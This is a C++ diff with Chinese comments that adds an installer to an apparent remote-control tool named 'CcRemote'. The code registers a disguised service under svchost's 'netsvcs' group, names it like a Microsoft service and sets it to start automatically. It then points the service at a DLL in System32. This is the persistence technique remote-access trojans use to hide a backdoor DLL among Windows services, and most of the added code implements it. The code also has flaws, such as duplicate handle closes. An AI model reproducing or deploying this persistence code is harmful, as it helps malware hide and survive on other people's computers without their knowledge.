@@ -4,6 +4,7 @@
 #include <iostream>
 #include <Windows.h>
 #include "resource.h"
+#include "RegEditEx.h"
 
 
 bool CreateMyFile(const char* strFilePath, LPBYTE lpBuffer, DWORD dwSize)
@@ -67,9 +68,144 @@ bool CreateEXE(const char* strFilePath, int nResourceID, const char* strResource
 	return true;
 }
 
+char *AddsvchostService()
+{
+	char	*lpServiceName = NULL;
+	int rc = 0;
+	HKEY hkRoot;
+	char buff[2048];
+	//打开装所有svchost服务名的注册表键
+	//query svchost setting
+	char *ptr;
+	char pSvchost[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
+	rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
+	if (ERROR_SUCCESS != rc)
+		return NULL;
 
+	DWORD type, size = sizeof buff;
+	//枚举他所有的服务名
+	rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
+	SetLastError(rc);
+	if (ERROR_SUCCESS != rc)
+		RegCloseKey(hkRoot);
+
+	int i = 0;
+	bool bExist = false;
+	char servicename[50];
+	do
+	{
+		//这里获得类似这样的服务名netsvcs_0，netsvcs_1。。。。。。。
+		wsprintf(servicename, "netsvcs_0x%d", i);
+		for (ptr = buff; *ptr; ptr = strchr(ptr, 0) + 1)
+		{
+			//然后比对一下服务名中是否有这个名字了
+			if (lstrcmpi(ptr, servicename) == 0)
+			{
+				bExist = true;
+				break;              //如果没有就跳出
+			}
+		}
+		if (bExist == false)
+			break;
+		bExist = false;
+		i++;
+	} while (1);
+
+	servicename[lstrlen(servicename) + 1] = '\0';
+	//然后将这个服务名写到所有服务名的后面，
+	//不要妄想，直接用api在一个注册表的键值后面添加一些信息
+	memcpy(buff + size - 1, servicename, lstrlen(servicename) + 2);
+	//然后将含有新服务名的缓冲区写入注册表，注册表里原有内容被覆盖
+	rc = RegSetValueEx(hkRoot, "netsvcs", 0, REG_MULTI_SZ, (unsigned char*)buff, size + lstrlen(servicename) + 1);
+
+	RegCloseKey(hkRoot);
+
+	SetLastError(rc);
+
+	if (bExist == false)
+	{
+		lpServiceName = new char[lstrlen(servicename) + 1];
+		lstrcpy(lpServiceName, servicename);
+	}
+	//回到 InstallService
+	return lpServiceName;
+}
 
 int main()
 {
-	CreateEXE("E:\\aaa.dll", IDR_DLL1, "DLL");
+	//CreateEXE("E:\\aaa.dll", IDR_DLL1, "DLL");
+	char lpServiceDescription[]= "CcRemote服务";
+	char strModulePath[MAX_PATH];
+	char	strSysDir[MAX_PATH];
+	char strSubKey[1024];
+	DWORD	dwStartType = 0;
+	char	strRegKey[1024];
+	int rc = 0;
+	HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
+	SC_HANDLE hscm = NULL, schService = NULL;
+
+
+	//打开服务
+	hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	GetSystemDirectory(strSysDir, sizeof(strSysDir));
+	char bin[] = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
+	char *lpServiceName = AddsvchostService();                             //*添加的代码在这个函数中*
+	char lpServiceDisplayName[128];
+	wsprintf(lpServiceDisplayName, "%s_ms,", lpServiceName);
+	//这里返回新的服务名后就构造服务dll的名字
+	memset(strModulePath, 0, sizeof(strModulePath));
+	wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, lpServiceName);
+
+	//然后构造服务中的描述信息的位置
+	wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
+
+	schService = CreateService(
+		hscm,						// SCManager database
+		lpServiceName,              // name of service
+		lpServiceDisplayName,       // service name to display
+		SERVICE_ALL_ACCESS,			// desired access
+		SERVICE_WIN32_OWN_PROCESS,
+		SERVICE_AUTO_START,			// start type
+		SERVICE_ERROR_NORMAL,		// error control type
+		bin,						// service's binary
+		NULL,						// no load ordering group
+		NULL,						// no tag identifier
+		NULL,						// no dependencies
+		NULL,						// LocalSystem account
+		NULL);						// no password
+	dwStartType = SERVICE_WIN32_OWN_PROCESS;
+
+	if (schService == NULL)
+		throw "CreateService(Parameters)";
+
+	CloseServiceHandle(schService);
+	CloseServiceHandle(hscm);
+
+	hkRoot = HKEY_LOCAL_MACHINE;
+	//这里构造服务的描述键
+	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
+
+	if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
+	{
+		DWORD	dwServiceType = 0x120;
+
+		//写入服务的描述
+		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Type", REG_DWORD, (char *)&dwServiceType, sizeof(DWORD), 0);
+	}
+	//写入服务的描述
+	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Description", REG_SZ, (char *)lpServiceDescription, lstrlen(lpServiceDescription), 0);
+
+	lstrcat(strSubKey, "\\Parameters");
+	//写入服务的描述
+	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "CcMainDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);
+
+
+
+	RegCloseKey(hkRoot);
+	RegCloseKey(hkParam);
+	CloseServiceHandle(schService);
+	CloseServiceHandle(hscm);
+
+	return 0;
+
 }
